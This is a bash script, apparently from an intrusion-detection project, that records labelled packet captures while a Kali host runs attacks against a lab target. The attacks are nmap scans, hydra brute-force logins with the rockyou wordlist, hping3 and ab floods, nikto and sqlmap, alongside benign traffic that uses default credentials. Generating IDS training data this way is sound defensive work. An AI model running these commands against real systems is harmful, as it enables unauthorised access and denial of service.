#!/bin/bash
IFACE=enp0s8
OUTDIR=~/ids-project/pcaps_lab
KALI="kali@192.168.100.20"
FILTER="(host 192.168.100.20 or host 192.168.100.30) and not (host 192.168.100.21 and port 22)"

LABELS=(
  "attack_nmap_synscan_run2"
  "attack_nmap_connect_run2"
  "attack_nmap_finscan_run1"
  "attack_nmap_nullscan_run1"
  "attack_nmap_xmasscan_run1"
  "attack_nmap_slow_run2"
  "attack_hydra_ftp_run2"
  "attack_hydra_ssh_run2"
  "attack_hydra_ssh_run3"
  "attack_hping_synflood_run2"
  "attack_hping_udpflood_run2"
  "attack_hping_icmpflood_run1"
  "attack_ab_httpflood_run2"
  "attack_nikto_run2"
  "attack_sqlmap_run2"
  "benign_web_run2"
  "benign_web_run3"
  "benign_ftp_login_run2"
  "benign_ssh_run2"
  "benign_mixed_idle_run1"
)

CMDS=(
  "nmap -sS -T4 -p- 192.168.100.30"
  "nmap -sT -T4 -p- 192.168.100.30"
  "nmap -sF -T3 -p 1-500 192.168.100.30"
  "nmap -sN -T3 -p 1-500 192.168.100.30"
  "nmap -sX -T3 -p 1-500 192.168.100.30"
  "nmap -sS -T1 -p 1-100 192.168.100.30"
  "timeout 60 hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt -t 16 ftp://192.168.100.30"
  "timeout 90 hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt -t 4 ssh://192.168.100.30"
  "timeout 90 hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 ssh://192.168.100.30"
  "timeout 20 hping3 -S -p 80 --flood 192.168.100.30"
  "timeout 20 hping3 --udp -p 53 --flood 192.168.100.30"
  "timeout 20 hping3 --icmp --flood 192.168.100.30"
  "ab -n 8000 -c 80 http://192.168.100.30/"
  "timeout 120 nikto -h http://192.168.100.30/ -Tuning 1"
  'timeout 120 sqlmap -u "http://192.168.100.30/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --batch --level=2'
  "for i in \$(seq 1 60); do curl -s http://192.168.100.30/ > /dev/null; curl -s http://192.168.100.30/mutillidae/ > /dev/null; sleep 1; done"
  "for i in \$(seq 1 40); do curl -s http://192.168.100.30/phpMyAdmin/ > /dev/null; curl -s http://192.168.100.30/dav/ > /dev/null; sleep 2; done"
  "for i in \$(seq 1 20); do curl -s ftp://msfadmin:msfadmin@192.168.100.30/ > /dev/null; sleep 3; done"
  "for i in \$(seq 1 20); do sshpass -p msfadmin ssh -o StrictHostKeyChecking=no msfadmin@192.168.100.30 'ls; whoami; uptime' > /dev/null 2>&1; sleep 3; done"
  "for i in \$(seq 1 30); do ping -c 1 192.168.100.30 > /dev/null; sleep \$((RANDOM % 4 + 1)); done"
)

for i in "${!LABELS[@]}"; do
  LABEL="${LABELS[$i]}"
  CMD="${CMDS[$i]}"
  OUT="$OUTDIR/${LABEL}.pcap"

  echo "=============================================="
  echo "[$((i+1))/${#LABELS[@]}] $LABEL"
  echo "CMD: $CMD"
  echo "=============================================="

  tcpdump -i "$IFACE" -w "$OUT" $FILTER &
  TCPDUMP_PID=$!
  sleep 2

  ssh "$KALI" "$CMD"

  sleep 2
  kill -INT "$TCPDUMP_PID" 2>/dev/null
  wait "$TCPDUMP_PID" 2>/dev/null

  echo "Saved: $OUT"
  ls -lh "$OUT" 2>/dev/null
  echo ""
  sleep 2
done

echo "ALL DONE."
ls -lh "$OUTDIR"
